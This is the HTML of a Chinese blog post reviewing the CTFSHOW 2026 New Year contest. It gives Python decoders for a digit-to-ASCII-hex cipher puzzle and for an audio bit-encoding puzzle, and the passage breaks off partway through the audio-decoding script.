<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【比赛】CTFSHOW-2026元旦跨年欢乐赛-CS2026 | 落殷回的博客</title><meta name="author" content="luoyinhui"><meta name="copyright" content="luoyinhui"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="赛后根据官方wp和大佬zs1994的wp学习整理了一下，感谢ctfshow组织比赛">
<meta property="og:type" content="article">
<meta property="og:title" content="【比赛】CTFSHOW-2026元旦跨年欢乐赛-CS2026">
<meta property="og:url" content="https://luoyinhui.github.io/posts/6e242bce/index.html">
<meta property="og:site_name" content="落殷回的博客">
<meta property="og:description" content="赛后根据官方wp和大佬zs1994的wp学习整理了一下，感谢ctfshow组织比赛">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://luoyinhui.github.io/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-8.png">
<meta property="article:published_time" content="2026-01-03T02:43:05.000Z">
<meta property="article:modified_time" content="2026-01-15T09:45:33.079Z">
<meta property="article:author" content="luoyinhui">
<meta property="article:tag" content="2026">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="ctfshow">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://luoyinhui.github.io/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-8.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "【比赛】CTFSHOW-2026元旦跨年欢乐赛-CS2026",
  "url": "https://luoyinhui.github.io/posts/6e242bce/",
  "image": "https://luoyinhui.github.io/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-8.png",
  "datePublished": "2026-01-03T02:43:05.000Z",
  "dateModified": "2026-01-15T09:45:33.079Z",
  "author": [
    {
      "@type": "Person",
      "name": "luoyinhui",
      "url": "https://luoyinhui.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/zhandian.png"><link rel="canonical" href="https://luoyinhui.github.io/posts/6e242bce/index.html"><link rel="preconnect"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.0"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css?v=7.0.1"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"DLCXYNBEA7","apiKey":"55cb2783d393395612712be2263ebaf1","indexName":"index","hitsPerPage":10,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":1000,"languages":{"author":"作者: luoyinhui","link":"链接: ","source":"来源: 落殷回的博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'medium_zoom',
  Snackbar: undefined,
  infinitegrid: {
    js: '/pluginsSrc/@egjs/infinitegrid/dist/infinitegrid.min.js?v=4.12.0',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【比赛】CTFSHOW-2026元旦跨年欢乐赛-CS2026',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><style type="text/css">#toggle-sidebar {bottom: 80px}</style><style>
  .aplayer .aplayer-notice{display:none!important}
</style>
<link rel="stylesheet" href="/css/custom.css"><style>:root { --glass-opacity-light: 0.5; --glass-opacity-dark: 0.2; --post-glass-opacity-light: 0.8; --post-glass-opacity-dark: 0.2; }</style><!-- hexo injector head_end start --><style>/* CSS for Hexo Butterfly Updates Heatmap */
.updates-heatmap {
  margin-bottom: 20px;
  padding: 20px;
  background: var(--card-bg, #fff);
  border-radius: 8px;
  box-shadow: var(--card-box-shadow, 0 3px 8px 6px rgba(7, 17, 27, 0.05));
  width: 100%;
  overflow: hidden;
  color: var(--font-color, #333);
}

[data-theme='dark'] .updates-heatmap {
  background: var(--card-bg, #1d1d1f);
  color: var(--font-color, #F7F7FA);
}

.heatmap-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 15px;
}

.heatmap-title {
  font-size: 1.2em;
  font-weight: bold;
  outline: none;
  border-bottom: 1px dashed transparent;
}

.heatmap-title:focus {
  border-bottom: 1px dashed #999;
}

.heatmap-legend {
  display: flex;
  align-items: center;
  font-size: 12px;
  color: var(--font-color, #888);
  gap: 4px;
}

.legend-item {
  display: flex;
  align-items: center;
  gap: 2px;
}

.legend-color {
  width: 10px;
  height: 10px;
  border-radius: 2px;
  display: inline-block;
}

.legend-label {
  color: var(--font-color, #888);
  margin: 0 4px;
}

.heatmap-container {
  width: 100%;
  display: flex;
  flex-direction: column;
}

.heatmap-months {
  display: grid;
  grid-template-columns: repeat(53, 1fr);
  margin-bottom: 5px;
  width: 100%;
}

.heatmap-month-label {
  font-size: 12px;
  color: var(--font-color, #888);
  grid-column: span 1;
  overflow: visible;
  white-space: nowrap;
}

.heatmap-grid {
  display: grid;
  grid-template-columns: repeat(53, 1fr);
  grid-template-rows: repeat(7, 1fr);
  grid-auto-flow: column;
  gap: 2px;
  width: 100%;
}

.heatmap-day {
  width: 100%;
  aspect-ratio: 1;
  border-radius: 2px;
  background-color: #ebedf0;
}

[data-theme='dark'] .heatmap-day {
  background-color: #2d333b;
}

.legend-color.level-0 { background-color: #ebedf0; }
[data-theme='dark'] .legend-color.level-0 { background-color: #2d333b; }

/* Green Theme */
.theme-green .level-1 { background-color: #9be9a8; }
.theme-green .level-2 { background-color: #40c463; }
.theme-green .level-3 { background-color: #30a14e; }
.theme-green .level-4 { background-color: #216e39; }

/* Blue Theme */
.theme-blue .level-1 { background-color: #a8d1ff; }
.theme-blue .level-2 { background-color: #63a7ff; }
.theme-blue .level-3 { background-color: #3079e0; }
.theme-blue .level-4 { background-color: #1a56ad; }

/* Pink Theme */
.theme-pink .level-1 { background-color: #ffc9c9; }
.theme-pink .level-2 { background-color: #ff8585; }
.theme-pink .level-3 { background-color: #e04545; }
.theme-pink .level-4 { background-color: #ad1a1a; }

/* Red Theme */
.theme-red .level-1 { background-color: #ffdce0; }
.theme-red .level-2 { background-color: #ff9b9b; }
.theme-red .level-3 { background-color: #ff4b4b; }
.theme-red .level-4 { background-color: #c91a1a; }

/* Orange Theme */
.theme-orange .level-1 { background-color: #ffe8cc; }
.theme-orange .level-2 { background-color: #ffb366; }
.theme-orange .level-3 { background-color: #ff8c1a; }
.theme-orange .level-4 { background-color: #cc6600; }

/* Purple Theme */
.theme-purple .level-1 { background-color: #e6ccff; }
.theme-purple .level-2 { background-color: #b366ff; }
.theme-purple .level-3 { background-color: #8c1aff; }
.theme-purple .level-4 { background-color: #6600cc; }

.updates-show-more-btn {
  text-align: center;
  cursor: pointer;
  padding: 10px 0;
  background: var(--card-bg, #fff);
  color: #49b1f5;
  border: 1px solid #ddd;
  border-radius: 8px;
  margin: 20px 0;
  width: 100%;
  transition: all 0.3s;
  user-select: none;
  display: block;
  visibility: visible;
  opacity: 1;
  font-size: 1.1em;
}

[data-theme='dark'] .updates-show-more-btn {
  background: var(--card-bg, #1d1d1f);
  color: #49b1f5;
  border: 1px solid #3d3d3d;
}

.updates-show-more-btn:hover {
  background: #f0f0f0;
  color: #FF7242;
}

[data-theme='dark'] .updates-show-more-btn:hover {
  background: #3d3d3d;
}

.year-label {
  text-align: center;
  margin-top: 10px;
  font-size: 0.9em;
  color: var(--font-color, #999);
}
</style><link rel="stylesheet" href="/css/swiper/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/swiper/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.0.0"><link rel="alternate" href="/atom.xml" title="落殷回的博客" type="application/atom+xml">
<link rel="alternate" href="/rss.xml" title="落殷回的博客" type="application/rss+xml">
</head><body><div id="web_bg" style="background-image: url(/img/shouye.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/updates/"><i class="fa-fw fas fa-history"></i><span> 更新</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-user-friends"></i><span> 社交</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-8.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">落殷回的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">【比赛】CTFSHOW-2026元旦跨年欢乐赛-CS2026</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/updates/"><i class="fa-fw fas fa-history"></i><span> 更新</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-user-friends"></i><span> 社交</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">【比赛】CTFSHOW-2026元旦跨年欢乐赛-CS2026</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-03T02:43:05.000Z" title="发表于 2026-01-03 10:43:05">2026-01-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-15T09:45:33.079Z" title="更新于 2026-01-15 17:45:33">2026-01-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>39分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;作者已经&quot;,&quot;messageNext&quot;:&quot;天没有更新了！！可能内容过时哦，如果您发现错误并希望告诉作者，请评论区留言或者向yluo3383@gmail.com发送邮件。&quot;,&quot;postUpdate&quot;:&quot;2026-01-15 17:45:33&quot;}" hidden></div><ul>
<li>一次乱七八糟的（指我做的）比赛复盘，有些能力之外就暂时不复盘了</li>
<li>官方wp指路：<a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/wiki/RZQ8whrVMib7xnkTerec5axOno2">https://ctf-show.feishu.cn/wiki/RZQ8whrVMib7xnkTerec5axOno2</a></li>
<li><a href="/posts/73235239/#CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026%E5%A4%A7%E4%BD%ACwp">点击跳转ak大佬wp预览</a></li>
</ul>
<h1>热身签到</h1>
<p>分类：CTF部分 | 分值：100</p>
<p>题目描述<br>
元旦时，我二舅姥爷给我出的密码题</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">54515552545455515456547055555566545654495548554855575370515051485150515453705555545755525456537054515551515051485150515450495568</span><br></pre></td></tr></table></figure>
<ul>
<li>我的解法
<ul>
<li>注意$1后面有空格</li>
</ul>
</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-2.png" alt="alt text"></p>
<ul>
<li>zs1994：</li>
</ul>
<blockquote>
<p>每两位 1 组分隔, 发现每个两位数都落在 48~70 的区间<br>
例如: 54 51 55 52 …<br>
正好是 ASCII 里的可打印字符范围</p>
</blockquote>
<ul>
<li>官方：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="string">&#x27;&#x27;&#x27;54515552545455515456547055555566545654495548554855575370515051485150515453705555545755525456537054515551515051485150515450495568&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_block</span>(<span class="params">block4: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(block4) != <span class="number">4</span> <span class="keyword">or</span> <span class="keyword">not</span> block4.isdigit():</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Bad block: <span class="subst">&#123;block4!r&#125;</span>&quot;</span>)</span><br><span class="line">    x = <span class="built_in">int</span>(block4[:<span class="number">2</span>])  <span class="comment"># 52</span></span><br><span class="line">    y = <span class="built_in">int</span>(block4[<span class="number">2</span>:])  <span class="comment"># 49</span></span><br><span class="line">    a = <span class="built_in">chr</span>(x)</span><br><span class="line">    c = <span class="built_in">chr</span>(y)</span><br><span class="line">    <span class="keyword">if</span> a <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span> <span class="keyword">or</span> c <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Bad hex nibble chars from block <span class="subst">&#123;block4!r&#125;</span>: <span class="subst">&#123;a!r&#125;</span><span class="subst">&#123;c!r&#125;</span>&quot;</span>)</span><br><span class="line">    b = <span class="built_in">int</span>(a + c, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0x20</span> &lt;= b &lt;= <span class="number">0x7E</span>):</span><br><span class="line"><span class="comment"># 检查 b 是否在可打印 ASCII 范围内（0x20 是空格，0x7E 是波浪号‘~’）</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Decoded to non-printable ASCII: <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">cipher: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cipher) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Cipher length must be multiple of 4.&quot;</span>)</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">4</span>):</span><br><span class="line">        out.append(dec_block(cipher[i:i+<span class="number">4</span>]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = dec(c)</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>其实感觉cyberchef能解决的也不咋用存脚本（？</li>
</ul>
<h1>HappySong</h1>
<ul>
<li>手打</li>
<li>我只能说以后碰到这种题目就把这个脚本扔ai当参考了。。除非后面深造编程可以学一下</li>
<li>官方脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># Copyright (c) 2025 CTF.SHOW (ctf.show) - https://ctf.show</span></span><br><span class="line"><span class="comment"># Author: h1xa</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">SAMPLE_RATE = <span class="number">44100</span></span><br><span class="line">BIT_DURATION = <span class="number">0.12</span></span><br><span class="line">HIT_DURATION = <span class="number">0.045</span></span><br><span class="line">GAP_BETWEEN_BYTES = <span class="number">0.09</span></span><br><span class="line"></span><br><span class="line">FREQ_ONE = <span class="number">180.0</span></span><br><span class="line">FREQ_ZERO = <span class="number">900.0</span></span><br><span class="line"></span><br><span class="line">PREAMBLE_BITS = [<span class="number">1</span>, <span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">PREAMBLE_SILENCE = <span class="number">0.25</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_wav_mono_16bit</span>(<span class="params">path: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">with</span> wave.<span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> wf:</span><br><span class="line">        ch = wf.getnchannels()</span><br><span class="line">        sw = wf.getsampwidth()</span><br><span class="line">        sr = wf.getframerate()</span><br><span class="line">        n = wf.getnframes()</span><br><span class="line">        <span class="keyword">if</span> sw != <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;unsupported sampwidth=<span class="subst">&#123;sw&#125;</span>, expected 16-bit PCM&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> sr != SAMPLE_RATE:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;unexpected sample_rate=<span class="subst">&#123;sr&#125;</span>, expected <span class="subst">&#123;SAMPLE_RATE&#125;</span>&quot;</span>)</span><br><span class="line">        raw = wf.readframes(n)</span><br><span class="line"></span><br><span class="line">    x = np.frombuffer(raw, dtype=np.int16).astype(np.float32) / <span class="number">32768.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">        x = x.reshape(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> (x[:, <span class="number">0</span>] + x[:, <span class="number">1</span>]) * <span class="number">0.5</span></span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;unsupported channels=<span class="subst">&#123;ch&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">goertzel_power</span>(<span class="params">x: np.ndarray, sr: <span class="built_in">int</span>, freq: <span class="built_in">float</span></span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    n = <span class="built_in">len</span>(x)</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span></span><br><span class="line">    k = <span class="built_in">int</span>(<span class="number">0.5</span> + (n * freq) / sr)</span><br><span class="line">    w = (<span class="number">2.0</span> * np.pi * k) / n</span><br><span class="line">    cosw = np.cos(w)</span><br><span class="line">    sinw = np.sin(w)</span><br><span class="line">    coeff = <span class="number">2.0</span> * cosw</span><br><span class="line"></span><br><span class="line">    s0 = <span class="number">0.0</span></span><br><span class="line">    s1 = <span class="number">0.0</span></span><br><span class="line">    s2 = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> x:</span><br><span class="line">        s0 = v + coeff * s1 - s2</span><br><span class="line">        s2 = s1</span><br><span class="line">        s1 = s0</span><br><span class="line"></span><br><span class="line">    real = s1 - s2 * cosw</span><br><span class="line">    imag = s2 * sinw</span><br><span class="line">    <span class="keyword">return</span> real * real + imag * imag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">classify_bit</span>(<span class="params">sig: np.ndarray</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    p1 = goertzel_power(sig, SAMPLE_RATE, FREQ_ONE)</span><br><span class="line">    p0 = goertzel_power(sig, SAMPLE_RATE, FREQ_ZERO)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> p1 &gt; p0 <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_at</span>(<span class="params">x: np.ndarray, start_sample: <span class="built_in">int</span>, nbits: <span class="built_in">int</span></span>):</span><br><span class="line">    bit_samps = <span class="built_in">int</span>(<span class="built_in">round</span>(BIT_DURATION * SAMPLE_RATE))</span><br><span class="line">    hit_samps = <span class="built_in">int</span>(<span class="built_in">round</span>(HIT_DURATION * SAMPLE_RATE))</span><br><span class="line"></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">        s = start_sample + i * bit_samps</span><br><span class="line">        e = s + hit_samps</span><br><span class="line">        <span class="keyword">if</span> e &gt; <span class="built_in">len</span>(x):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        seg = x[s:e]</span><br><span class="line">        out.append(classify_bit(seg))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_preamble_offset</span>(<span class="params">x: np.ndarray</span>):</span><br><span class="line">    bit_samps = <span class="built_in">int</span>(<span class="built_in">round</span>(BIT_DURATION * SAMPLE_RATE))</span><br><span class="line">    hit_samps = <span class="built_in">int</span>(<span class="built_in">round</span>(HIT_DURATION * SAMPLE_RATE))</span><br><span class="line">    step = <span class="built_in">max</span>(<span class="number">1</span>, bit_samps // <span class="number">10</span>)</span><br><span class="line">    best = (<span class="literal">None</span>, -<span class="number">1</span>)</span><br><span class="line">    max_start = <span class="built_in">len</span>(x) - (<span class="built_in">len</span>(PREAMBLE_BITS) * bit_samps + hit_samps)</span><br><span class="line">    <span class="keyword">if</span> max_start &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;wav too short&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_start, step):</span><br><span class="line">        bits = decode_at(x, off, <span class="built_in">len</span>(PREAMBLE_BITS))</span><br><span class="line">        <span class="keyword">if</span> bits <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        score = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(bits, PREAMBLE_BITS) <span class="keyword">if</span> a == b)</span><br><span class="line">        <span class="keyword">if</span> score &gt; best[<span class="number">1</span>]:</span><br><span class="line">            best = (off, score)</span><br><span class="line">            <span class="keyword">if</span> score == <span class="built_in">len</span>(PREAMBLE_BITS):</span><br><span class="line">                <span 